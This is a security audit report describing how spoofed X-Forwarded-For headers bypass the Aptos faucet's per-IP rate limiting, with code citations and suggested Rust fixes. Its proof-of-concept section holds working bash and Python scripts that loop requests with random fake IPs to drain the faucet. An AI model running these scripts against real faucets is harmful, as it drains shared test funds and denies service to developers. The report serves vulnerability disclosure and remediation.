# Audit Report

## Title
Complete Bypass of IP-Based Rate Limiting via Spoofed X-Forwarded-For Headers Enabling Faucet Draining

## Summary
The Aptos faucet's IP-based rate limiting can be completely bypassed by spoofing HTTP proxy headers (X-Forwarded-For, X-Real-IP). The faucet uses poem framework's `RealIp` extractor to determine client IP addresses, which blindly trusts these headers without validation. An attacker can rotate through unlimited fake IP addresses to drain the faucet's token balance.

## Finding Description
The faucet implements IP-based rate limiting through `MemoryRatelimitChecker` and `RedisRatelimitChecker` to prevent abuse. The source IP address is extracted using poem's `RealIp::from_request()` method, which automatically reads from HTTP headers like `X-Forwarded-For` and `X-Real-IP`. [1](#0-0) 

The extracted IP is then stored in `CheckerData` and used by all rate limiting checkers: [2](#0-1) [3](#0-2) 

The rate limiting logic in both checkers relies entirely on this extracted IP: [4](#0-3) [5](#0-4) 

**The Critical Flaw:** There is no mechanism to configure trusted proxies or validate that the IP extracted from headers is trustworthy. If an attacker can send HTTP requests directly to the faucet (or through an untrusted proxy), they can include arbitrary values in the `X-Forwarded-For` header.

**Attack Execution:**
1. Attacker sends request 1 with header: `X-Forwarded-For: 1.1.1.1`
2. Attacker sends request 2 with header: `X-Forwarded-For: 1.1.1.2`
3. Attacker sends request 3 with header: `X-Forwarded-For: 1.1.1.3`
4. Continue with unlimited fake IPs...

Each request appears to come from a different IP address, completely bypassing the `max_requests_per_day` limit. With IPv6, attackers have access to 2^64 addresses in a single /64 allocation, making this attack trivially scalable.

## Impact Explanation
This vulnerability enables **complete draining of the faucet's token balance**, resulting in:

1. **Economic Impact**: Attackers can claim the maximum amount per request unlimited times, depleting testnet tokens intended for legitimate developers
2. **Denial of Service**: Legitimate users cannot access faucet tokens for testing
3. **Testnet Degradation**: Without functioning faucets, the testnet becomes unusable for development

According to the Aptos bug bounty severity categories, this qualifies as **High Severity** due to "significant protocol violations" - the faucet is a critical component of the testnet infrastructure. The issue could also be classified as **Medium Severity** for "limited funds loss" depending on the faucet's token reserves.

## Likelihood Explanation
**Likelihood: VERY HIGH**

This vulnerability is trivially exploitable because:

1. **Zero Technical Barrier**: Any HTTP client can set custom headers (curl, Python requests, browser extensions)
2. **No Authentication Required**: The attack works against the public faucet endpoints
3. **Unlimited Address Space**: IPv6 provides 2^64 addresses per /64 allocation
4. **No Detection**: Each spoofed IP appears legitimate to the rate limiting system
5. **Direct Exposure**: The faucet service is typically exposed directly on port 8081 without properly configured reverse proxies [6](#0-5) 

The attack requires no special tools, insider knowledge, or computational resources - only the ability to send HTTP requests with custom headers.

## Recommendation

**Immediate Fix:** The faucet should NOT trust proxy headers unless explicitly configured to do so. Implement one of the following solutions:

**Option 1 - Use Direct TCP Connection IP (Recommended for Simple Deployments):**
Replace `RealIp` with direct connection IP extraction from poem's `RemoteAddr`:

```rust
use poem::web::RemoteAddr;

// In fund endpoint:
async fn fund(
    &self,
    fund_request: Json<FundRequest>,
    source_addr: &RemoteAddr, // Direct TCP connection IP
    header_map: &HeaderMap,
) -> poem::Result<Json<FundResponse>, AptosTapErrorResponse> {
    let source_ip = source_addr.0;
    // Use source_ip.ip() for rate limiting
}
```

**Option 2 - Implement Trusted Proxy Configuration (For Production with Reverse Proxies):**
Add configuration to specify trusted proxy IP ranges and only extract forwarded IPs when requests come from trusted proxies:

```rust
pub struct TrustedProxyConfig {
    pub trusted_proxy_ranges: Vec<IpNet>,
}

fn extract_real_ip(
    remote_addr: IpAddr,
    headers: &HeaderMap,
    trusted_proxies: &[IpNet],
) -> IpAddr {
    // Only trust X-Forwarded-For if request comes from trusted proxy
    if trusted_proxies.iter().any(|net| net.contains(&remote_addr)) {
        // Extract from X-Forwarded-For, taking leftmost IP
        // (the original client, not the last proxy)
        if let Some(xff) = headers.get("x-forwarded-for") {
            if let Some(first_ip) = xff.to_str().ok()
                .and_then(|s| s.split(',').next())
                .and_then(|s| s.trim().parse().ok()) {
                return first_ip;
            }
        }
    }
    // Otherwise use direct connection IP
    remote_addr
}
```

**Deployment Best Practice:**
Ensure reverse proxies (HAProxy, nginx) are configured to:
1. Strip incoming X-Forwarded-For headers from untrusted sources
2. Add their own X-Forwarded-For with the actual client IP
3. Only allow faucet access through the reverse proxy

## Proof of Concept

```bash
#!/bin/bash
# PoC: Bypass faucet rate limiting by spoofing X-Forwarded-For header

FAUCET_URL="http://localhost:8081/fund"
AMOUNT=100000000000  # Maximum amount

# Generate random addresses and drain faucet
for i in {1..1000}; do
    # Generate random IPv4 for X-Forwarded-For header
    FAKE_IP="$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
    
    # Generate random Aptos address to fund
    ADDRESS=$(aptos key generate --output-file /tmp/key_$i.json 2>&1 | grep "account" | awk '{print $3}')
    
    # Make request with spoofed IP
    curl -X POST "$FAUCET_URL" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $FAKE_IP" \
        -d "{\"address\": \"$ADDRESS\", \"amount\": $AMOUNT}"
    
    echo "Request $i sent with spoofed IP: $FAKE_IP"
    sleep 0.1
done

echo "Successfully bypassed rate limiting with spoofed IPs"
```

**Alternative PoC using Python:**

```python
import requests
import random

faucet_url = "http://localhost:8081/fund"
amount = 100_000_000_000

for i in range(1000):
    # Generate fake IP
    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    # Generate random address (simplified)
    address = "0x" + "".join([f"{random.randint(0,15):x}" for _ in range(64)])
    
    response = requests.post(
        faucet_url,
        json={"address": address, "amount": amount},
        headers={"X-Forwarded-For": fake_ip}
    )
    
    print(f"Request {i}: Status {response.status_code}, IP {fake_ip}")
    if response.status_code == 200:
        print(f"  âœ“ Successfully drained {amount} tokens")
```

Both proof of concepts demonstrate that rate limiting is completely ineffective against an attacker who can spoof the X-Forwarded-For header.

## Notes

The security question incorrectly identifies `IpRangeManager` as the "primary control" for rate limiting. In reality, `IpRangeManager` is only used for static IP allowlists/blocklists [7](#0-6) , while actual rate limiting is performed by `MemoryRatelimitChecker` and `RedisRatelimitChecker`. Both rate limiting implementations are vulnerable to the header spoofing attack described above.

The vulnerability exists in the core faucet implementation and affects all deployments that don't have properly configured reverse proxies that strip untrusted proxy headers before forwarding requests to the faucet service.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L106-108)
```rust
        // This automagically uses FromRequest to get this data from the request.
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-225)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L237-242)
```rust
        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L76-88)
```rust

        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
            return Ok(vec![RejectionReason::new(
                format!(
                    "IP {} has exceeded the daily limit of {} requests",
                    data.source_ip, self.max_requests_per_day
                ),
                RejectionReasonCode::UsageLimitExhausted,
            )]);
        } else if !dry_run {
            *requests_today += 1;
        }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L236-243)
```rust
        // Generate a key corresponding to this identifier and the current day.
        let key_prefix = self.ratelimit_key_provider.ratelimit_key_prefix();
        let key_value = self
            .ratelimit_key_provider
            .ratelimit_key_value(&data)
            .await?;
        let (key, seconds_until_next_day) =
            self.get_key_and_secs_until_next_day(key_prefix, &key_value);
```

**File:** docker/compose/validator-testnet/docker-compose.yaml (L76-77)
```yaml
    ports:
      - "8081:8081"
```

**File:** crates/aptos-faucet/core/src/common/ip_range_manager.rs (L10-21)
```rust
/// Generic list checker, for either an allowlist or blocklist.
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct IpRangeManagerConfig {
    /// Path to a file containing one IP range per line, where an IP range is
    /// something like 32.143.133.32/24.
    pub file: PathBuf,
}

pub struct IpRangeManager {
    pub ipv4_list: IpRange<Ipv4Net>,
    pub ipv6_list: IpRange<Ipv6Net>,
}
```
